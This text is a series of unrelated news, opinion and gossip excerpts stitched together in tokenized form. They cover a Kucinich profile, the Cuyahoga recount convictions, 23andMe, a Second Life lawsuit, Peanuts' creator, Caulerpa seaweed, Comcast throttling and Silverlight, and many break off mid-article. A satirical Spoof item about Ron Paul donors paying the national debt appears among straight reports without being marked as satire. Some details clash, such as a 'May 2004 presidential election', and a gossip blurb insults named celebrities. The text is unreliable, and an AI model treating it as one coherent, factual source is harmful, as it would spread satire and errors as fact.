He has voted in favor of banning late - term abortions completely , with no exception for the health of the mother .
He also voted to make it a crime , punishable by up to two years in prison , for doctors to perform late - term abortions .
He opposed giving federal workers coverage for contraceptives in their health - care plans .
He supported President Bush 's efforts to restrict the use of U.S. family planning funds overseas .
He opposed funding for stem - cell research .
In 1996 , he told Planned Parenthood that he did not support the substance of Roe v. Wade .
Kucinich claims to be pro-choice now , but as Markos Moulitsas , the founder of the liberal blog DailyKos , noted with disgust on his website earlier this year : " His transformation to being pro-choice happened literally overnight — a week after he announced his 2004 presidential bid .
One moment he was virulently anti-choice , the next he was a staunch defender . "
Kucinich says that he " evolved . "
But that supposed evolution involves a flip - flop on abortion even bigger than Mitt Romney's , and strikes many as insincere and politically expedient .
Moulitsas , for example , might seem a natural ally of Kucinich since both opposed the Iraq war , but Moulitsas can't stomach Kucinich 's stances on abortion .
He 's written that he now responds to Kucinich 's name with one word : " Ugh . "
When people tell Kucinich to his face that his chances of winning this season 's Democratic nomination ( much less the presidency ) are slim to none , he always refuses to go along with their skepticism .
In April , on Real Time with Bill Maher , Maher began his interview with Kucinich by saying : " No one considers that you 're really going to win this nomination . "
To which Kucinich replied : " Oh , I think I am . "
Maher stammered , dumbfounded — and after a long beat of silence , there was a smattering of applause from the audience .
But the effect was to make Kucinich look crazy .
He does n't really believe he 's going to win , does he ?
It 's a trap that Kucinich is caught in as a fringe candidate running in his second long - shot race .
If he concedes that he 's not going to win ( again ) , he has to explain why he's there ( again ) .
Vanity ?
Publicity ?
To make a symbolic point ?
Because he likes the great hotel rooms he and Elizabeth get to stay in on the campaign trail ?
( Well , probably not that last one , given that Kucinich had only raised about $ 1.1 million as of July , about 57 times less than fundraising front - runner Hillary Clinton had ; in New Hampshire , they shared a room at a cheap Super 8 motel near the airport . )
On the flip side , if Kucinich pretends he 's actually got a serious chance of winning , he looks , well , out of touch with reality , as he did on Bill Maher — and someone who 's out of touch with reality is not what Americans , Democrats or Republicans , are looking for after eight years of George W. Bush .
On his show , Maher threw Kucinich a lifeline after telling him he had no chance .
" This is what I 'm getting at : If you go through your platform , it 's like , universal health care , ending the drug war , getting serious about the environment , pulling out of Iraq right away — I do n't know why you 're the crazy one , is what I 'm saying .
It does n't seem radical to me . "
Why then , Maher wondered , was n't Kucinich polling higher ?
" It 's only a matter of time , " Kucinich replied .
It may be a matter of a very , very long time .
It took Ohio 15 years to come around and realize Kucinich was right about Muni Light .
It 's going to take Democrats more than two election cycles to see a vegan peace candidate as electable to the presidency — if they ever do .
Democratic primary voters want a winner , especially after the last two elections .
So it does n't matter that Kucinich is in the right place on a lot of progressive issues — even , belatedly , on abortion — or that he has a lot of fans of his strident opposition to the North American Free Trade Agreement , or that former Federal Reserve Chairman Alan Greenspan , in his new book , The Age of Turbulence : Adventures in a New World , seems to validate Kucinich 's particular brand of antiwar rhetoric , writing : " I am saddened that it is politically inconvenient to acknowledge what everyone knows :
The Iraq war is largely about oil . "
( The week the book was published , Kucinich crowed , via press release : " I 've been saying that for five years ...
Now , the former Fed chairman corroborates that I 've been right all along . " )
It also does n't matter that Kucinich has been making a lot of noise lately about impeaching Cheney , even drawing Congressman McDermott in as a cosponsor of the articles of impeachment he filed against the vice president in the House earlier this year .
And , in the end , it does n't matter that Kucinich was right about invading Iraq when other Democrats and a certain sex - advice columnist were wrong — even though , as detractors have pointed out , Kucinich did vote in favor of removing Saddam Hussein from power in 1998 , back before he became the unflinching " peace candidate " that he is now .
What matters is that Kucinich simply can't win , and has done nothing — in terms of fundraising , poll showings , crowd drawing , or inspiring rhetoric — to demonstrate that he can .
Still , even if it's not his first aim , he does serve one purpose in the primary race .
In a party that has long chafed at the rightward tilt of its most marketable candidates , Kucinich , like Ralph Nader , helps to draw the other Democrats ' rhetoric and campaign - trail promises back toward the left .
Even better , unlike Nader , Kucinich disappears after the primary is over ; as a successful Democratic congressman , Kucinich can't very well drop his party affiliation and run as an independent in the general election , siphoning votes away from the chosen Democratic candidate .
In 2004 , when he lost the race for the nomination , he quietly went back to being a congressman , and he 's likely to do the same this time around .
" There are a lot of politicians who try to get to the top by compromising all the time , " says Congressman McDermott , who will not be supporting Kucinich .
" Dennis is going to make that real tough for the others , because they 're going to be on the stage with a guy who 's saying , ' Hey , what about this ? '
' What about that ? '
' What are you talking about ? '
And to the extent that he does that , he has contributed to the body politic something that needs to be there . "
But the reality of politics , McDermott said , is that electoral success means compromise , and being right in the past on something like a failed war that a majority of Americans initially backed does n't necessarily make a good platform .
To illustrate this , McDermott told of taking his staff recently to see one of his favorite statues in the U.S. Capitol .
It 's a likeness of Ernest Gruening , a Democratic senator from Alaska in the 1960s .
McDermott 's young staffers had no idea who Gruening was .
Gruening , McDermott pointedly explained , was one of two senators to vote against the Gulf of Tonkin resolution authorizing the Vietnam war .
Now he 's a nobody .
Kucinich likes to remind everyone who will listen that he was right to vote against the Iraq war , that he is somebody because of that , that he should even be elected president because of that .
McDermott , who also voted against the Iraq war , sees it differently .
" The guys who had the perspicacity to see it can't be upset by the fact that nobody gives them credit for it , " he said .
Kucinich can and will be upset by this lack of credit .
He seems ready to run a whole primary campaign around his need for recognition for being right on Iraq .
He 's run this kind of campaign in the past , to great success .
But feelings about the Iraq war are not as settled in this country as feelings about the Muni Light affair are in Cleveland .
A slogan like " Because he was right " might not even be enough for a political rock star like Obama this season ; given that , there 's not much reason to think it will put Kucinich over the top .
Maybe some day Kucinich will get the credit he feels he deserves for being among the few who were right about the Iraq war all along .
Maybe someone will build a statue of him somewhere .
Perhaps it will even be intended as a monument to his rightness about a disastrous war .
Perhaps , then , young people will be taken occasionally to view this statue , and perhaps some wise older person will occasionally tell young people who Kucinich was and , for a brief moment , before they forget that they ever heard his name , these future voters will give Kucinich what he so desperately craves : vindication .
But odds are better that Kucinich , like Gruening , will be a nobody one day , too — and probably a lot sooner than he thinks .
This piece is adapted from a profile of Dennis Kucinich , written by Eli Sanders and Dan Savage , that will be published in November in The Contenders , a book of profiles of the Democratic presidential candidates .
The book was put together by Seven Stories Press , www.sevenstories.com.
Rumor has it that Florida governor Charlie Crist will announce tomorrow that his state plans to scrap tens of millions of dollars worth of touchscreen voting equipment and move to a system based completely on optical scan ballots .
The Miami Herald claims that the total tab for overhauling the state 's electoral system could be as high as $ 35 million .
If it turns out that Florida does ditch the touchscreens and go back to a solution with a better paper trail , then the state will be following the lead of counties across the country , including Ohio's Cuyahoga County and Florida 's own Sarasota County .
However , to my knowledge , Florida will be the first state to outlaw touchscreens on a statewide basis .
Speaking of Cuyahoga County , home of notorious levels of touchscreen - related trouble in both the primaries and the May 7 general elections last year , two election officials have been convicted of rigging a recount of ballots cast in the May 2004 presidential election .
Here 's a bit of background on the convictions and a short recap of what happened .
The Green and Libertarian presidential candidates have been involved in ongoing efforts to get a recount of the 2004 Ohio presidential vote .
Ohio 's election rules for a recount mandate that 3 % of the precincts be recounted by hand , and if the results from this initial recount match up with the election night totals , then the rest of the county 's precincts can be recounted by machine .
However , if the results of the initial manual recount do n't match up , then the entire county has to be recounted by hand .
Now , the important thing to note about this 3 % recount is that the precincts included in it must be randomly selected .
Otherwise , elections officials who do n't want to risk the cost and labor of manually recounting millions of ballots could just select precincts where they suspect ( or in some cases , know for certain ) that the manual recount will come out right .
This is what elections officials in Cuyahoga County pulled , and it's why two of them may be going to jail .
Cuyahoga County officials spent three days behind closed doors doing an illegal " pre-count " so that they could identify which precincts would produce correct results , thereby allowing them to do the rest of the recount by machine .
Then , they delivered stacks of these pre-counted ballots to the official recount team , who then went through ( by now pointless ) theatrics of manually recounting the ( already counted ) ballots .
The reason that the Cuyahoga folks got busted was that there was someone at the official recount with a video camera , and this person videotaped election workers Jacqueline Maiden and Kathleen Dreamer dropping off boxes of ballots for the recount that were pre-sorted into " Bush " and " Kerry " stacks .
When they were asked why these supposedly randomly selected ballots were already sorted into neat piles , the workers responded on camera to the effect that the 3 % sample was not in fact random , but had been carefully selected so that it would product the correct results .
It 's because of this videotaped evidence that these two workers were convicted .
Blackbox Voting reports that their supervisors — the folks ultimately responsible for this farce — got off scot - free , as did elections officials in other counties where this was done but no one was dumb enough to admit to it on camera .
I was not always so comfortable in my own genome .
Before I spit into the vial , I called several major insurance companies to see if I was hurting my chances of getting coverage .
They said no , but that is now , when almost no one has such information about their genetic make - up .
In five years , if companies like 23andMe are at all successful , many more people presumably would .
And is n’t an individual ’s relative risk of disease precisely what insurance companies want to know ?

Last month , alone in a room at 23andMe ’s headquarters in Mountain View , Calif. , with my password for the first time , I wavered ( genetic ? ) and walked down the hall to get lunch .
Once I looked at my results , I could never turn back .
I had prepared for the worst of what I could learn this day .
But what if something even worse came along tomorrow ?
Some health care providers argue that the public is unprepared for such information and that it is irresponsible to provide it without an expert to help put it in context .
And at times , as I worked up the courage to check on my risks of breast cancer and Alzheimer ’s , I could see their point .
One of the companies that plans to market personal DNA information , Navigenics , intends to provide a phone consultation with a genetic counselor along with the results .
Its service would cost $ 2,500 and would initially provide data on 20 health conditions .
DeCODE Genetics and 23andMe will offer referrals .
Although what they can tell you is limited right now , all three companies are hoping that people will be drawn by the prospect of instant updates on what is expected to be a flood of new findings .
I knew I would never be able to pass up the chance to fill in more pieces of my genetic puzzle .
But I had decided not to submit my daughter ’s DNA for testing — at least not yet — because I did n’t want to regard anything about her as predestined .
If she wants to play the piano , who cares if she lacks perfect pitch ?
If she wants to run the 100 - meter dash , who cares if she lacks the sprinting gene ?
And did I really want to know — did she really want to know someday — what genes she got from which parent and which grandparent ?
A legal dispute over the theft of virtual sex toys has resulted in a real - life slap on the wrist .
A federal judge accepted the settlement Thursday of a lawsuit filed last year against a Texas man accused of stealing sex toys developed for the online world , " Second Life . "
According to the settlement , Robert Leatherwood agreed not to copy , display or distribute any items sold by Eros LLC , a Tampa Bay - area company that creates virtual sex scripts in the " Second Life " universe .
Leatherwood must also disclose the e-mail addresses of anyone he knows had access to his " Second Life " persona , known as " Volkov Catteneo . "
The settlement does not involve money or any admission of wrongdoing , court documents show .
It effectively ends the suit filed last year by Eros ' owner , Kevin Alderman , of Lutz .
He sued to stop the unauthorized distribution of Eros creations , which allow " Second Life " users to equip their online personas , known as avatars , with realistic genitalia .
Products also allow users to engage in various sexual actions in the online world .
Francis Taney , a Pennsylvania attorney representing Eros , said the case remains one of the first real - world legal fights involving two " Second Life " users over their online conduct .
The other is a New York case Taney filed on behalf of Eros .
Reached at his grandmother 's home in North Richland Hills , Texas , Leatherwood acknowledged he sold Eros products , but said the whole case had been overblown .
" I did it in private , " he said .
" I was n't out to do a huge market thing .
I was doing it for a little bit of money . "
Leatherwood said he agreed to settle the case because he is 19 and did n't have money for an attorney .
He said he stopped selling Eros products online a year ago , and he rarely uses " Second Life " anymore .
He said the whole case was " ridiculous , " and likely cost Alderman thousands of dollars .
He also said he thought it would be hard to hold him liable .
" He had no evidence or proof of anything I did , " Leatherwood said .
Taney said Alderman is " moving on . "
He scoffed at Leatherwood 's contention that there was n't enough evidence to pursue the case , noting that he had previously publicly denied he sold Eros items .
" Out of a nation of 300 million people , we tracked the kid down to his living room in North Richland Hills , Texas , " Taney said .
While the case does n't create legal precedent , Taney said it does seem to transfer some real - world principles to the online universe .
" This is a technology that has to be dealt with by lawyers , by business people , by regular citizens , " Taney said .
" I think it fits quite nicely into existing concepts . "

The Brits Are Drowning In Debt
Man Gets Stolen Mustang Back 38 Years Later
IT WAS always the same old trick .
Lucy , smiling innocently , would hold a football for Charlie Brown to kick .
For nearly 50 years , she would convince her hapless , moon - faced friend to ignore precedent and trust her .
“ I 'm a changed person , ” she would say .
But at the very last moment , she would always yank the ball away , sending him flying through the air and on to his back with a thud .
A misunderstood boy in a hostile world , Charlie Brown would just sigh .
Readers of the “ Peanuts ” comic strip , who ultimately exceeded 355 m , could not get enough of these neurotic , melancholic children .
“ Are n't all kids egotists ?
And brutal ? ” asked Charles Schulz , the man behind the first mainstream comic strip ever regularly to use the word “ depressed ” .
Schulz acknowledged in 1964 that “ maybe I have the cruellest strip going . ”
But Americans responded to these little characters with big heads , finding humour in their disarmingly spare meditations on loneliness and resignation .
“ Peanuts ” became a $ 1.2 billion industry and Schulz a national treasure , praised for his simple wisdom and Midwestern sensibility .
He drew every one of the 17,897 strips by hand himself .
But Schulz — “ Sparky ” to his friends — was far more complicated than that , according to a lively , engaging new biography by David Michaelis .
Raised in Minnesota , the only child of stoic , uneducated immigrant parents ( German and Norwegian ) , he was an awkward boy and an unhappy man : shy , lonely and haunted by anxieties .
He could be witty and kind , but also competitive , righteous , needy and prone to bear grudges .
He yearned for approval and assumed he was being rejected .
His mother 's death , when he was 21 , was a loss he never seemed to recover from .
“ He always felt that no one really loved him , ” a cousin observed .
“ I do n't think I can ever be happy , ” he announced to his first wife on their honeymoon .
( “ Good grief , ” she surely thought . )
Drawing was his retreat .
Despite his insecurities , he knew he was good , and his ambition was to have a comic strip of his own — at a time when the “ funny pages ” were the country 's great popular entertainment .
He learned the tricks of the trade through mail - order art lessons .
He later became a teacher at the same art school , where he met some of his closest friends ( including a bumbling chap named Charles Brown ) .
He spent his 20s living with his father , hunched over his drafting table , collecting rejections from newspapers — and the few women he plucked up the nerve to talk to .
Cartooning was a sort of revenge .
Schulz never liked the name Peanuts , which was his syndicate 's idea , and he was never especially fond of children .
He drew them because “ they were what sold ” .
But these tiny characters were a clever Trojan horse for his more adult themes .
The strip , Mr Michaelis writes , “ was about people working out the interior problems of their daily lives without ever actually solving them . ”
“ Peanuts ” let Schulz harness his melancholy and channel his conflicted feelings .
Though the author never met the man , he had the help of Schulz 's family and full access to his papers during his six years of research .
But some of Schulz 's children ( he had five ) and his second wife have spoken out against this portrait of a dark and unhappy man .
“ This was the man I found , ” Mr Michaelis responded .
“ To their children , fathers are always heroes . ”
As he was dying of cancer in 2000 , Schulz , aged 77 , was still talking about getting even with the bullies of his youth .
Dictating his final message to his readers , the multimillionaire with hundreds of millions of fans was suddenly filled with bitterness : “ You know ” , he said , “ that poor kid , he never even got to kick the football . ”
And it was n't clear whether he was talking about Charlie Brown , or himself .
An Afghan court on Tuesday sentenced a 23 - year - old journalism student to death for distributing a paper he printed off the Internet that three judges said violated the tenets of Islam .
The three - judge panel sentenced Sayad Parwez Kambaksh to death for distributing a paper that humiliated Islam , said Fazel Wahab , the chief judge in the northern province of Balkh .
Wahab , who did not preside over the trial , said he did n't know anything about the paper other than that it was against Islam .
Kambaksh discussed the paper with his teacher and classmates at Balkh University .
Several students complained to the government .
Kambaksh's family and the head of a journalists ' group denounced the verdict and said Kambaksh was not represented by a lawyer at trial .
Members of a clerics ' council had been pushing for Kambaksh to be punished .
The case now goes to the first of two appeal courts .
Kambaksh , who has been jailed since October , will remain in custody during appeal .
Kambaksh's brother , Yacoubi Brahimi , described Tuesday 's proceeding as a " secret trial , " saying the family did not know it had been scheduled .
Wahab said only President Hamid Karzai can pardon Kambaksh because he had confessed to violating the tenets of Islam .

Back in the early 1980 ’s , the Wilhelmina Zoo in Stuttgart was looking into various types of seaweed for use in their aquarium displays .
They settled on a species known as Caulerpa taxifolia , since its bright green , feathery fern - like fronds were quite pretty , and it was both hardy and fast - growing .
In addition , it produces chemicals that make it taste awful to marine animals , so it would n’t get eaten .
By repeatedly subjecting specimens to harsh aquarium conditions and selecting the ones that survived the best , researchers developed Caulerpa taxifolia ( Vahl ) C. Agandh , a new - and - improved , genetically distinct strain which was particularly hardy and fast - growing .
This variety was ideal for their purposes and it was shared with other museums and aquariums .
For a time , all was well and good in the world of marine botany .
In 1984 , however , a square meter patch of this new variety of Caulerpa was found in the Mediterranean off the shore of Monaco , right outside the Oceanographic Museum .
Evidently a little piece of it was flushed down a drain .
But while those organizations involved in dealing with the accidental release exercised their blame - pointing fingers , Caulerpa spread .
It was , after all , particularly hardy and fast - growing .
By the time anyone got around to doing anything about it , the infestation covered several acres and was beyond anyone ’s control .
By 2001 , there were thousands of acres of this remarkably prolific plant clogging coastal waters around the Mediterranean .
A Caulerpa infestation looks like a vast meadow of leafy , green fronds .
And nothing else .
The meadows have been compared to fields of wet , overgrown Astroturf .
It grows as much as three inches a day , fast enough to crowd out other algae , and since it tastes awful , aquatic herbivores wo n’t go near it .
Because it creates immense fields of desert - like undersea monotony , humans are crowded out as well .
The bland landscape becomes uninteresting to divers , diminishing the tourism industry ; and seaside fishermen lose interest as their favorite fish move on to more accommodating waters .
Its appearances as far away as Spain , Croatia , and Tunisia are believed to be the result of Caulerpa being picked up by fishing nets and anchors .
Since it ’s particularly hardy , it is n’t bothered by typical harbor pollution and it happily lies waiting to hitch a ride .
A tiny fragment no larger than a fingernail is all that is needed to spawn a new plant , which means that the usual mechanical seaweed - removal methods can actually spread an infestation rather than contain it .
A Caulerpa meadow
Controlling the plant with natural predators is also problematic .
While there are a few mollusks that will munch happily on the other strains of Caulerpa , they cannot tolerate the temperatures of the Mediterranean , and they would be unable to eat it fast enough to be useful anyway .
Meanwhile , Caulerpa was working its way around the globe via the aquarium trade .
In 2000 , two small patches were found off the shore of San Diego , CA .
Additional patches were spotted off southeast Australia .
It is believed that these were the result of people dumping the contents of their salt - water aquaria down the drain .
Aware of the danger , agencies in California sprang into action .
The state passed a law banning the possession and sale of nine species of Caulerpa .
The City of San Diego topped them by banning all Caulerpa species .
The infestations were dealt with through drastic measures .
Marine biologists led an all - out assault on the invader .
Armed with the latest weapons in botanical warfare , they completely covered and sealed the patches with black plastic tarps to cut off sunlight .
Next , they pumped deadly chlorine under the tarps , killing every last trace of the enemy – along with anything else that had the misfortune to be trapped along with it .
Six years and $ 7 million later , California can boast the world ’s first successful victory over a Caulerpa invasion .
Mediterranean countries are doing what they can with mechanical removal , and Australia is trying copper sulfate , a potent herbicide .
In both places , the infestations are too large for the California treatment .
Meanwhile the United States has declared a war on mutant seaweed , exercising the federal Noxious Weed Act ( 1999 ) and the federal Plant Protection Act ( 2000 ) to ban the importation , interstate sale , and transport of the menacing Caulerpa .
A public education campaign in California is also underway .
Nonetheless , a recent survey showed that there are still stores selling the banned species .
Not only do home hobbyists frequently lack the expertise to identify the illegal immigrants , but dealers , distributors , and inspectors may also lack this knowledge .
Bans have also been enacted in Spain , France , and Australia .
A " Wanted " poster from the California Environmental Protection Agency
Invasive species are certainly nothing new .
The current infestation of rabbits in Australia is perhaps the most well - known example of a foreign species causing the decline and extinction of various indigenous species .
This invasion was launched by a landowner who immigrated from England and wanted to continue his rabbit - hunting hobby .
Additionally , in 19th Century America , “ acclimation societies ” were trendy among those well - to - do who wanted to better mankind through scientific dabbling .
Members encouraged the introduction and spread of non-native species for various beneficial uses .
Kudzu , presently infesting the southeast US , was brought over from Japan for use as animal fodder and ground cover .
House sparrows were imported from Britain to control insects , only to quickly become as annoying a pest as the insects they were meant to control .
Even after it became apparent that the introduced species were becoming problems , they still continued bringing in new ones .
What separates Caulerpa from other invasive varieties is that it does not occur in nature .
It is the product of selective - breeding genetic manipulation , pre-packaged with a man-made advantage which allows it to out - compete natural species .
Although Genetically Modified ( GM ) crops are invaluable in feeding millions of poor⁠ — usually by producing more nutrients , growing in harsher environments , producing larger yields , and / or resisting predators ⁠ —
Caulerpa serves as a sobering illustration of the risks involved in developing alternatives which are hardier than their natural cousins .
Today this mutant seaweed serves as a test case for the control of an accidentally - released unnatural strain , demonstrating the importance of quick and comprehensive action .
The ease at which it spreads and grows has earned Caulerpa a spot on the World Conservation Union ’s “ 100 World ’s Worst Invasive Alien Species ” List .
It remains to be seen whether or not the spread of Caulerpa can be contained , or whether it will wind up being the equivalent of aquatic kudzu .
Perhaps over time we ’ll find some Caulerpa - consuming sea creatures we can introduce to feast upon the unwanted plants ; and hopefully we wo n’t need to find something to control the Caulerpa eaters .
Failing that , some genetic tinkering might yield some kind of particularly hardy and fast - growing Caulerpa predator , and we can pit one mutant against another .
With enough time , tarps , and successive creature - eaters , our victory over un -nature is inevitable .
30 Sep 07 , CLUTE , TX , USNA -- Ron Paul 's presidential campaign announces its volunteers have begun paying the national debt shortfall of the United States of North America on an ongoing basis .
Campaign director Jesse Benton describes the effort as " just another grassroots idea that had legs and took off running " .
Last Monday , Paul 's campaign made a typical appeal for additional donations to end the third quarter of 2007 in excellent fundraising condition .
A relatively standard fundraiser " thermometer " , web - enhanced with bells and whistles , graced their homepage .
The widget code for this applet was quickly replicated by early viral bloggers , some of whom decided to place it in juxtaposition with the " National Debt Clock " applet that measures the rate at which the federal debt of $ 9 trillion is accumulated .
Within 24 hours , at least 100 bloggers had been inspired to copy this fortuitous combination .
( Advertising policies at The Spoof forbid us from linking any of them . )
Apparently there is intense interest in comparing the rate at which Paul 's supporters move fiat money voluntarily out of their pockets , and the rate at which the government moves money by fiat out of Paul 's supporters ' pockets .
Before the fundraising deadline , the campaign suddenly found itself in a vicious cycle of reaching the challenged donation amount , raising the challenge , and reaching the challenged amount again , observed Benton .
Meanwhile the idea bubbled up among the volunteers --
The Spoof was unable to determine who originated it -- of synchronizing the two clocks .
It took only a few more days of appeals to Paul 's forty thousand unofficial meetup groups before the two funds reached parity yesterday at 10:32 p.m. EDT ; they have remained comfortably synchronized .
The most successful contribution method was for volunteers to schedule ongoing regular direct - draft pledge deductions from their payroll checks -- coincidentally , the same method the federal government uses to obtain its own " contributions " .
The Paul campaign continues to receive donations from supporters worldwide at a stable rate of about $ 1 billion per day .
Paul said via blog that he was " floored and sky - high " about the free - market solution to the debt problem , praising it as an exciting workaround to the Federal Reserve 's monopoly stranglehold .
He assured his hundreds of millions of supporters that any excess above campaign costs would be promptly directed to pay down the deficit -- as long as the trend continues , and as soon as they can figure out how to do it under Federal Election Commission regulations .
Incidentally , the Federal Election Commission had no comment , but a brief which appeared under " Recent Regulatory Activity " on their website may be responsive to Paul 's unique situation .
Last night via this link the FEC promulgated regulations creating an " improper format " fine on election reports that show receipts in excess of the permitted numeric character count of eleven digits ( including pence ) .
The fine is $ 1 billion for each offending billion .
Other candidates belittled Paul 's success .
Rudy Rompson claims to have had his " best fundraising night ever " this weekend after Paul supporters threw him into Lake Huron .
Rompson 's third - quarter receipts are still expected to trail behind Paul's .
Candidate and trance - channeler Johnny R. " John " Edward accused Paul 's donors of being spammers who have created hundreds of false identities , bank accounts , and home addresses per person , merely to escape the $ 2,300 individual - donation cap .
He also ridiculed the donors ' supply - side solution as wholly ineffective , because it merely maintains deficit parity without touching the underlying national debt liability .
President - Elect Clinton shrugged , " Who is Ron Paul ? "
However , Clinton is also expected to report less than $ 1 billion in third - quarter receipts , being a paragon of FEC compliance .
Clinton was recently required to deduct from her campaign receipts the sum of $ 850,000 , disallowed by the FEC after she disclosed that , while trying to find out why her foot was hurting , she discovered the amount of cash in her left Hsu .
Campaign fundraising director Jon Bydlak also had no comment , but Benton assured The Spoof that Bydlak was unexpectedly busy with menial fundraising tasks , like bullion shipment insurance , international settlement reconciliation , and creation of Caymans shell corporations .
Bydlak had also applied for permission to be designated as a new Federal Reserve system bank , but was turned down yesterday , so , Benton speculated , he may need to buy the Fed instead .
Michael Jackson Throws Paul McCartney to the Curb
Face falling , scarf wearing , lipstick lovingis remaking his Thriller album for it 's 25th year anniversary .
Must not be able to come up with anything new or innovative .
The worst part is that he is leavingout of the remake for the song " The Girl is Mine . "
What a shame , I think that most people like Paul McCartney and have forgiven him for marrying crazy bat Heather Mills .
Back in the day I really loved that song !
Could it be that McCartney actually dissed the alleged pedophile this go round ?
Jacko is now working with producer Will I Am in yet another attempt on Michael 's part to bring his tarnished reputation and lackluster career back to the stage .
I wonder if that is why he is wearing the tape on his face lately ?
Maybe he is worried that his nose and lips are going to fall .

Under pressure from agriculture industry lobbyists and lawmakers from agricultural states , the Environmental Protection Agency wants to drop requirements that factory farms report their emissions of toxic gases , despite findings by the agency ’s scientists that the gases pose a health threat .
The EPA acknowledges that the emissions can pose a threat to people living and working nearby , but it says local emergency responders do n’t use the reports , making them unnecessary .
But local air - quality agencies , environmental groups and lawmakers who oppose the rule change say the reports are one of the few tools rural communities have for holding large livestock operations accountable for the pollution they produce .
Â
Opponents of the rule change say agriculture lobbyists orchestrated a campaign to convince the EPA that the reports are not useful and misrepresented the effort as reflecting the views of local officials .
They say the plan to drop the reporting requirement is emblematic of a broader effort by the Bush - era EPA to roll back federal pollution rules .

Comcast 's response yesterday to its public thrashing by the FCC may have had a second , more important , purpose : A prominent Congressman has introduced legislation paving the way for a ban on Internet throttling .
In the midst of an already overflowing legislative calendar , Rep. Ed Markey ( D - Mass . ) , who chairs the House Subcommittee on Telecommunications and the Internet , introduced a bill yesterday whose end result could be the illegalization of throttling of bandwidth to certain customers by Internet service providers .
But the bill , tentatively entitled the Internet Freedom Preservation Act of 2008 , would not actually declare throttling illegal specifically .
Instead , it would call upon the Federal Communications Commission to hold a hearing to determine whether or not throttling is a bad thing , and whether it has the right to take action to stop it .
Advertisement
" Within 90 days after the date of the enactment of this Act , the Federal Communications Commission ... shall commence a proceeding on broadband services and consumer rights , " reads the text of the first draft of H. R. 5353 .
" As part of the proceeding ... the Commission shall assess whether broadband network providers adhere to the Commission 's Broadband Policy Statement of August , 2005 including whether , consistent with the needs of law enforcement , such providers refrain from blocking , thwarting , or unreasonably interfering with the ability of consumers to -- access , use , send , receive , or offer lawful content , applications , or services over broadband networks , including the Internet . "
The FCC 's opinion of throttling as a business practice would seem to be wholly negative , if it were n't simultaneously so tentative .
Last month , the Commission tasked its Wireline Competition Bureau to seek comments on allegations by P2P provider Vuze that Comcast 's throttling practice -- intended to curb high - bandwidth file sharing that Comcast believes to typically be unlicensed -- is actually cutting into its legitimate business .
The Bureau 's call for comments was anything but neutral , declaring outright " that the practice of broadband service providers of degrading peer - to - peer traffic violates the FCC's Internet Policy Statement , and that such practices do not meet the Commission 's exception for reasonable network management . "
Yesterday , Comcast filed a formal response to the Bureau which dared to invoke a political hot potato usually reserved for attacking Comcast , in its own defense .
" The [ Bureau 's ]
Petitions assert that it is per se unreasonable for Comcast to manage certain P2P protocols , even ones that have been proven to degrade customers ' abilities to surf the web , watch video streaming , make voice - over - Internet Protocol calls , or access other Internet content , applications , and services , particularly during periods of peak network congestion , " reads Comcast 's public comment .
" The Petitions base their claims primarily on a ' test ' of Comcast 's network management practices using P2P protocol services .
As demonstrated [ later in this document ] , no valid conclusions about the effects of Comcast 's network management practices could be drawn from that test because the test did not replicate how P2P protocols operate in the real world .
" The carefully limited measures that Comcast takes to manage traffic on its broadband network -- including its very limited management of certain P2P protocols -- are a reasonable part of Comcast 's strategy to ensure a high - quality , reliable Internet experience for all Comcast High - Speed Internet customers , " the company continued .
" Importantly , in managing its network , Comcast does not block any content , application , or service ; discriminate among providers ; or otherwise violate any aspect of the principles set forth in the [ FCC's ] Internet Policy Statement . "
How the FCC chooses to address Comcast 's assertions may have a direct impact on whether the Markey bill , also introduced yesterday , will have any teeth whatsoever , or whether it would instead serve merely to place Rep .
Markey on the populist side of a prominent argument .
As Rep . Markey stated on the House floor yesterday , " There are some who may wish to assert that this bill regulates the Internet .
It does no such thing .
The bill contains no requirements for regulations on the Internet whatsoever .
It does , however , suggest that the principles which have guided the Internet 's development and expansion are highly worthy of retention , and it seeks to enshrine such principles in the law as guide stars for US broadband policy .
The bill tasks the FCC with the job of conducting an assessment of broadband practices and consumer rights .
Finally , it requires the FCC to hold eight broadband summits around the nation and to report back to Congress on its findings and any recommendations for further action . "
But the bill has already garnered prominent opposition on the part of the wireless industry association CTIA .
This afternoon , its president and CEO , former Oklahoma Republican representative ( and former Tulsa Hurricane football great )
Steve Largent issued this response : " This bill is an attempt to cure a problem that simply does not exist .
Overwhelming evidence collected by the [ FCC ] , the Federal Trade Commission , and independent research analysts proves that wireless broadband adoption is spreading like wildfire across this country .
This would n't be happening if consumers were n't getting the service , value , and access to content they desire ... These are serious issues for carriers and consumers alike , and we believe a thoughtful and balanced examination will lead to what we already know : Government intervention is not necessary . "

My good friend Robert O'Callahan discusses Silverlight on his latest blog entry , in particular , he asks the question :
No matter how good Silvelright is or how bad the alternatives are , Silverlight domination will be a really bad thing for free software so I question why Miguel wants to push in that direction .
Robert , it is very easy .
I have been using Linux as my main desktop operating system since 1992 and endured every missing feature , every broken driver , every broken X setup and every missing application since I started .
I did so because it was free software , and I had decided that I wanted to run my entire system with free software .
I felt that dogfooding Linux and improving Linux on a day - to - day basis would help improve this OS as opposed to improving a proprietary OS .
Sure , using a proprietary OS had its benefits : more consistency , more QA , more applications , lots of support , latest video drivers , but they were not free .
So I stuck with free software .
Today the only proprietary software that I use on my desktop is Flash ( I have acrobat installed , but I use Evince instead , keep it for those cases where Evince has a bug ) .
From my perspective , it is crucial for Linux to have good support for Silverlight because I do not want Linux on the desktop to become a second class citizen ever again .
Robert , you are asking those of us that use FOSS operating systems to " take one for the team " by not endorsing Silverlight , but yet , you are not willing to live among us .
If you are going to preach , preach by example .
The core of the debate is whether Microsoft will succeed in establishing Silverlight as a RIA platform or not .
You believe that without Moonlight they would not have a chance of success , and I believe that they would have regardless of us .
In fact , I believe strongly that it is part of Microsoft becoming more open and adapting itself to the multitude of shifts in this industry ( open sourcing IronPython , IronRuby , the DLR , the JS library for ASP.
NET , the MS - PL , the MS - RL , opening up their code , and so on ) .
Ever since I met Benjamin Zander am a hopeless romantic , and believe in a world of possibility .
I find myself to be happier this way than joining these ranks .
And what better way of bringing Silverlight to Linux than to work together with Microsoft : they are giving us specs , they are giving us their test suites , and they are providing technical assistance .
Its been a pleasure to work with them , and everything we write is open source software , I for one , could not ask for more .
Now , regardless of the strategic discussion about endorsing Silverlight , there are technicalities about Silverlight that make it a fascinating platform .
I personally want to write cross platform web applications using C# , Boo , Python and Ruby .
And that matters to me , and matters to others .
And I have loved Silverlight since it embedded the CLR runtime .
Nothing new there , you can read the gory details of my fascination from back then .
You advocate using standards that are implemented by multiple vendors .
But what if none of those vendors is providing what I want ?
